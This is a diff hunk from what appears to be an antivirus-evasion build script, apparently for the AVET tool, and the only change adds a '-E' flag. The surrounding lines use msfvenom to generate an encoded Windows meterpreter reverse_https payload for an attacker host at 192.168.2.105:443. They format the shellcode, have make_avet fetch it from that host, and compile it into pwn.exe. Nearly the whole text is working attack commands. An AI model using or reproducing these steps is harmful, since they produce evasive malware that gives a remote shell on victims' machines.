@@ -7,7 +7,7 @@ msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.105 lport=443 -e x
 # format the shellcode for make_avet
 ./format.sh sc.txt > scclean.txt && rm sc.txt
 # call make_avet, compile 
-./make_avet -u 192.168.2.105/scclean.txt -p
+./make_avet -E -u 192.168.2.105/scclean.txt -p
 $win32_compiler -o pwn.exe avet.c
 # cleanup
 echo " " > defs.h
